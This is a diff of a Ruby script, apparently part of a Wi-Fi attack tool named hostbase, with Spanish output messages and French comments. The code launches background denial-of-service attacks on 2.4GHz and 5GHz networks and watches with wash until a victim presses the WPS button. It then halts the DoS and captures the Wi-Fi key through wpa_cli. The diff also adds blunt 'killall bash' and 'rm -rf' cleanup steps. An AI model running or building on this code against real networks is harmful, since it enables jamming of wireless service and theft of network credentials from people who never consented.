@@ -7,7 +7,7 @@ require 'highline/import'
 
 
 trap "SIGINT" do
-  puts "\e[1;94m[*] Exit... limpieza de los ficheros\e[0m"
+ puts "\e[1;94m[*] Exit... limpieza de ficheros...\e[0m"
 sleep 3
 Dir.chdir '/tmp/hostbase-1.4ES'
 sleep 1
@@ -30,7 +30,7 @@ $cartef = cartef.chomp
 File.open("cartedos.txt").readlines.each do |cartedos|
    puts cartedos
 $cartedos = cartedos.chomp
-puts "Iniciando las tarjetas wifi..."
+puts "Vuelta a la normal de las tarjetas wifi..."
 `ifconfig #{$cartef} down`
 `iw dev #{$cartef} set type managed`
 sleep 2
@@ -47,6 +47,8 @@ sleep 2
 sleep 4
 `rm -rf /var/lib/dhcp/dhcpd.leases`
 `rm -rf *.txt`
+`killall wash`
+`killall bash`
 puts "Bye..."
 exit
 end
@@ -64,7 +66,7 @@ sleep 1
 `rm -rf *.txt`
 `rm -rf *.pid`
 sleep 2
-puts "Iniciando la tarjeta wifi..."
+puts "Vuelta a la normal de las tarjetas wifi..."
 `ifconfig wlan5 down`
 `ip link set wlan5 name wlan1`
 `ip link set wlan1 down`
@@ -77,6 +79,8 @@ sleep 3
 `systemctl start NetworkManager.service`
 sleep 5
 `rm -rf /var/lib/dhcp/dhcpd.leases`
+`killall wash`
+`killall bash`
 puts "Bye..."
 exit
 end
@@ -97,36 +101,28 @@ sleep 2
 sleep 2
 `ip link set #{$cartedos} up`
 sleep 2
-Start.activeDos
+New.activeDos
 end
 
 def self.activeDos
-puts "La DoS en 2.4GHz va a empezar ahora..."
+puts "Iniciando la DoS en 2.4GHz..."
 dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
-Start.dosBis
+New.dosBis
 sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
 end
 
 def self.dosBis
-puts "La DoS en 5GHz va a empezar ahora..."
+puts "Iniciando la DoS en 5GHz..."
 dosbis = Thread.new { `bash rundos5ghz.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve)
-Start.victimeAttente  # on appelle la fonction dont on a besoin
+New.victimeAttente  # on appelle la fonction dont on a besoin
 sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
 end
 
 
 def self.victimeAttente     
-Dir.chdir '/tmp/hostbase-1.4ES'
-sleep 2
-load 'historiquebis.rb'
-puts "Esperamons que alguien se conecta... ctrl+c para salir..."
-wash = Thread.new do
-  while true
-    system "wash -i #{$cartedos} -b #{$apmac} -j > wash.txt"   # On lance hostapd_cli wps_pbc en tant que thread
-sleep(20)     # Temps avant la relance de la commande
-  end
-end
-Setup.wpsPush # on appelle la fonction dont on a besoin
+puts "Iniciando wash..."
+wash = Thread.new { `bash wash.sh` }
+New.wpsPush # on appelle la fonction dont on a besoin
 sleep(5000000)        
        # Lancement de hostapd_cli a rajouter ici
        # Appel du script rogueinit et/ou de la méthode correspondante
@@ -136,10 +132,11 @@ sleep(5000000)
    def self.wpsPush 
 Dir.chdir '/tmp/hostbase-1.4ES'
 sleep 2
+puts "Esperamos que alguien se conecta... ctrl+c para salir..."
 until File.read('wash.txt').include?('wps_selected_registrar')
 sleep 1
 end
-puts "\e[1;32m[[*] Alguièn se ha conectado y el boton WPS ha sido apyado...\e[0m"
+puts "\e[1;32m[[*] Un uasario se ha conectado y el boton WPS ha sido apoyado...\e[0m"
 puts "\e[1;32m[*] Paramos la DoS...\e[0m"
 Dir.chdir '/tmp'
 sleep 1
@@ -149,6 +146,7 @@ Dir.chdir '/tmp/hostbase-1.4ES'
 sleep 2
 if File.exist?("terminalfrequence.pid")
 Process.kill 15, File.read('/tmp/hostbase-1.4ES/terminalfrequence.pid').to_i
+Process.kill 15, File.read('/tmp/hostbase-1.4ES/wash.pid').to_i
 `killall wash`
 else
 nil
@@ -167,7 +165,7 @@ sleep 3
 `rfkill unblock all`
 `ip link set #{$cartedos} up`
 sleep 6
-       puts "\e[1;32m[*] Esperamos de tener la clave wifi...\e[0m"
+       puts "\e[1;32m[*] Esperamos la clave wifi...\e[0m"
 `killall wpa_supplicant`
 Dir.chdir '/etc'    
 sleep 1
@@ -183,7 +181,7 @@ wpacli = Thread.new do
     sleep(20) # Temps avant la relance de la commande
   end
 end
-Setup.wpsGrab  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
+New.wpsGrab  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
  sleep(5000000)
 end
 
